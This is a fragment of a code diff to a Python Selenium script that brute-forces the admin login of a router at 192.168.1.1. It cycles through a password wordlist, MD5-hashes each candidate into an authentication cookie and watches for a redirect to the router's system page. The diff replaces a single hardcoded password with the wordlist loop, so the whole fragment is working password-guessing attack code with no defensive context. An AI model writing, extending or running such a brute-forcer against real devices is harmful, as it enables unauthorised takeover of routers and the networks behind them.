@@ -29,7 +29,6 @@ def start():
     webdriver1.get(url)
     print("Open the url ...")
     login = "admin"
-    password = "error404"
     tipsvalue = webdriver1.find_element_by_xpath("//input[contains(@name, 'tipsFlag')]")
     timevalue = webdriver1.find_element_by_xpath("//input[contains(@name, 'timevalue')]")
 
@@ -40,9 +39,9 @@ def start():
 
     count = 0
     for line in Lines:
-        print(line.strip())
+        password = line.strip()
         passwordMD5 = hashlib.md5(line.strip().encode()).hexdigest()
-        add_cookies(loginMD5, passwordMD5)
+        print(add_cookies(loginMD5, passwordMD5))
         print("try "+str(count)+" with Login = " + str(login) + " and Password = " + str(password))
         count+=1
         if (webdriver1.current_url == "http://192.168.1.1/rpSys.html"):
